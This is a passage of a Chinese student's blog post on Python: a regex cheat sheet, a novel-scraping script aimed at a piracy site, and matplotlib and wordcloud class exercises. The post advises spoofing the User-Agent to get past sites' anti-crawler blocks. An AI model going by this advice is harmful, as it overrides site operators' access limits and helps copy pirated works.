punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>@\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span>\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>$<span class="token operator">**</span>域名：<span class="token operator">**</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">+</span>\<span class="token punctuation">.</span>?<span class="token operator">**</span>InternetURL：<span class="token operator">**</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">:</span><span class="token operator">//</span><span class="token punctuation">[</span><span class="token operator">^</span>\s<span class="token punctuation">]</span>\<span class="token operator">*</span> 或 <span class="token operator">^</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">/</span>?<span class="token operator">%</span><span class="token operator">&amp;</span><span class="token operator">=</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span>?$<span class="token operator">**</span>手机号码：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">14</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">15</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span><span class="token number">4</span><span class="token operator">|</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">6</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">8</span><span class="token operator">|</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">18</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">6</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">8</span><span class="token operator">|</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>\d<span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>电话号码<span class="token punctuation">(</span><span class="token string">"XXX-XXXXXXX"</span>、<span class="token string">"XXXX-XXXXXXXX"</span>、<span class="token string">"XXX-XXXXXXX"</span>、<span class="token string">"XXX-XXXXXXXX"</span>、<span class="token string">"XXXXXXX"</span>和"XXXXXXXX<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3.4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">)</span>?\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>国内电话号码<span class="token punctuation">(</span><span class="token number">0511</span><span class="token operator">-</span><span class="token number">4405222</span>、<span class="token number">021</span><span class="token operator">-</span><span class="token number">87888822</span><span class="token punctuation">)</span>：<span class="token operator">**</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">**</span>电话号码正则表达式（支持手机号码，<span class="token number">3</span><span class="token operator">-</span><span class="token number">4</span>位区号，<span class="token number">7</span><span class="token operator">-</span><span class="token number">8</span>位直播号码，<span class="token number">1</span>－<span class="token number">4</span>位分机号）<span class="token punctuation">:</span> <span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">)</span><span class="token operator">**</span>身份证号<span class="token punctuation">(</span><span class="token number">15</span>位、<span class="token number">18</span>位数字<span class="token punctuation">)</span>，最后一位是校验位，可能为数字或字符X：<span class="token operator">**</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">15</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">17</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>\d<span class="token operator">|</span>X<span class="token operator">|</span>x<span class="token punctuation">)</span>$<span class="token punctuation">)</span><span class="token operator">**</span>帐号是否合法<span class="token punctuation">(</span>字母开头，允许<span class="token number">5</span><span class="token operator">-</span><span class="token number">16</span>字节，允许字母数字下划线<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span>9_<span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>密码<span class="token punctuation">(</span>以字母开头，长度在<span class="token number">6</span><span class="token operator">~</span><span class="token number">18</span>之间，只能包含字母、数字和下划线<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span>\w<span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>强密码<span class="token punctuation">(</span>必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 <span class="token number">8</span><span class="token operator">-</span><span class="token number">10</span> 之间<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span>\d<span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>强密码<span class="token punctuation">(</span>必须包含大小写字母和数字的组合，可以使用特殊字符，长度在<span class="token number">8</span><span class="token operator">-</span><span class="token number">10</span>之间<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span>\d<span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>日期格式：<span class="token operator">**</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">**</span>一年的<span class="token number">12</span>个月<span class="token punctuation">(</span><span class="token number">01</span>～<span class="token number">09</span>和<span class="token number">1</span>～<span class="token number">12</span><span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>$<span class="token operator">**</span>一个月的<span class="token number">31</span>天<span class="token punctuation">(</span><span class="token number">01</span>～<span class="token number">09</span>和<span class="token number">1</span>～<span class="token number">31</span><span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">30</span><span class="token operator">|</span><span class="token number">31</span><span class="token punctuation">)</span>$<span class="token operator">**</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里我们需要注意的是<strong>^[\u4e00-\u9fa5]{0,}$<strong>，这个是汉字的编码范围，在爬虫过程中经常会有一个爬目录的操作^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=]*)?$对于</strong>URL</strong>编码的正则匹配同样很重要。</p><p>3 python爬虫实战</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Pattern<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5200804</span><span class="token punctuation">,</span><span class="token number">5719275</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'https://www.1biquge.com/8/8145/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.html'</span></span>    a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    a<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>    <span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./源代码.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"源代码.txt"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    file_handle <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'小说文本.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    line <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    newa <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">u'[\n\s*\r\u3002\uff1b\uff0c\uff1a\u201c\u201d\uff08\uff09\u3001\uff1f\u300a\u300b\u4e00-\u9fa5]'</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>newa<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>line<span class="token punctuation">)</span>    n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>         file_handle<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>    file_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个实际上是一个还没有弄完的脚本，因为我爬取的是笔趣阁的小说，毕竟笔趣阁本身就是盗版网站加密也没那么麻烦，还真让我爬出来了一些信息。但是在爬取过程在还是注意到开发者是做了简易的防爬虫操作的，在一定的章节后，他随机的增加了一个四位数字，这导致了以上代码在进行无意义的空跑，但是还是发现这个代码可以应用于同网站少数小说的爬取，猜测是当时网站还没有做防爬虫的操作。</p><p>之后在类似的爬取其他内容过程中，发现有些网站爬虫根本无法爬取。花了一些时间研究，找到结论，我们一般写的爬虫会默认告诉服务器自己发送了一个Python爬取请求，而一般网站是不允许被爬虫访问的，估计是因为会涉及到企业根本吧。最后，我们可以通过更改User-Agent字段就可以轻易骗过该网站。</p><p>我们可以使用<strong>fake_useragent</strong>进行User-Agent字段的欺骗，这里就不再展示</p><p>最后提示一句**《刑法》第217条第1项规定，以营利为目的，未经著作权人许可，复制发行其文字作品、音乐、电影、电视、录像作品、计算机软件及其他作品，处以有期徒刑，并处或单 处罚金。 **大家未来对爬虫技术掌握爬虫技术之后，能从网络上爬取一些东西，但绝对不要违法。</p><h2 id="5-0-问题导入"><a href="#5-0-问题导入" class="headerlink" title="5.0 问题导入"></a>5.0 问题导入</h2><blockquote><p>使用 wordcloud 和 matplotlib.pyplot 方法对“222.txt”中的分词制作 分词云图，并保存为“分词云图 1.png”。 </p><p>使用“222.txt”中出现频率最高的前 10 个词语，制作条形图，X 轴对应 10 个词语，y 轴对应每个词语的频率值，保存成“条形图 2.png”。</p></blockquote><p>上面是上一次实验课，于刊老师的问题，下面是我解决这两道题目的方式，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#课本提示我们汉语要设置字体，不然乱码</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'SimHei'</span>a<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'333.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span><span class="token comment">#这个是之前李师姐讲到的读写操作</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#print (a)</span><span class="token comment">#print(df['词语'])</span><span class="token comment">#测试用数据可以忽略</span>x<span class="token operator">=</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span>y<span class="token operator">=</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span>figure<span class="token operator">=</span>plt<span class="token punctuation">.</span>Figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 要先pip install wordcloud</span><span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordClouda<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'333.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#fit_word函数，接受字典类型，其他类型会报错</span>dic<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>wordcloud <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>font_path<span class="token operator">=</span><span class="token string">'simhei.ttf'</span><span class="token punctuation">,</span>background_color<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">,</span>width <span class="token operator">=</span><span class="token number">4000</span><span class="token punctuation">,</span>height<span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">,</span>margin<span class="token operator">=</span> <span class="token number">10</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>fit_words<span class="token punctuation">(</span>dic<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wordcloud<span class="token punctuation">)</span><span class="token comment"># 显示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_2.png" style="zoom:72%;" /><p>这里使用了<strong>matplotlib库</strong>和<strong>wordcloud库</strong>两个库实现，</p><p>其实做 Python的数据可视化，可以使用的库分别是<strong>Matplotlib</strong>，<strong>Seaborn</strong>，<strong>Bokeh</strong>，<strong>Plotly</strong>，<strong>Pyecharts</strong>等。</p><p>我们课本主要将的是<strong>Matplotlib</strong>库，我其实没有在互联网上找到matplotlib库的官方中文文档的，关于这些自学起来实际上是看的浏览器的翻译，如有错误还请海涵……</p><h2 id="5-1-matplotlib库基础"><a href="#5-1-matplotlib库基础" class="headerlink" title="5.1 matplotlib库基础"></a>5.1 matplotlib库基础</h2><h3 id="拓展：默认值相关"><a href="#拓展：默认值相关" class="headerlink" title="拓展：默认值相关"></a>拓展：默认值相关</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">fig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax<span class="token operator">=</span>fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>fig.add_axes([])<strong>里面的参数分别指的距离左边，下边，坐标轴宽度，坐标轴高度，范围是(0, 1)等价于</strong>plt.axes()</strong></p><p><strong>ax=fig.add_axes([0.1,0.1,0.8,0.8])<strong>语句表示的是在画布中，坐标轴距离画布左边0.1倍的位置，距离下边0.1倍的位置，确定了这两个位置后，坐标轴的整体宽度和高度占0.8倍的大小，换句话说，距离右边和上边0.9<del>（0.1+0.8）</del>倍。执行如下代码，会生成一张带有坐标轴的白色，两个语句实际上都是</strong>默认值</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pyplot<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> which<span class="token operator">=</span><span class="token string">'major'</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token comment">##**kwargs 允许你将不定长度的键值对, 作为参数传递给一个函数。 如果你想要在一个函数里处理带名字的参数, 你应该使用**kwargs</span><span class="token comment">#以下是一个实例：</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> linestyle <span class="token operator">=</span> <span class="token string">"--"</span><span class="token punctuation">,</span>color <span class="token operator">=</span> <span class="token string">"gray"</span><span class="token punctuation">,</span> linewidth <span class="token operator">=</span> <span class="token string">"0.5"</span><span class="token punctuation">,</span>axis <span class="token operator">=</span> <span class="token string">'both'</span><span class="token punctuation">)</span>  <span class="token comment"># 显示网格，这个参数默认为forse</span><span class="token comment"># linestyle：线型</span><span class="token comment"># color：颜色</span><span class="token comment"># linewidth：宽度</span><span class="token comment"># axis：x，y，both，显示x/y/两者的格网</span>pyplot<span class="token punctuation">.</span>title<span class="token punctuation">(</span>label<span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> loc<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>tick_params<span class="token punctuation">(</span>bottom<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">,</span>top<span class="token operator">=</span><span class="token string">'off'</span><span class="token punctuation">,</span>left<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token string">'off'</span><span class="token punctuation">)</span>  <span class="token comment"># 显示刻度的那根轴线，凸出来的地方。设置为off时都不显示。默认为全显示</span><span class="token comment">#plt.axis('off')</span><span class="token comment"># 关闭坐标轴</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要了解这些具体的参数还是推荐去看下那个纯英文的matplotlib库手册</p><p>显示创建画布和坐标轴的好处是让我们对绘图过程有了完全的控制权（比如可以指定在什么地方绘图），而且绘图的逻辑更强 。</p><pre 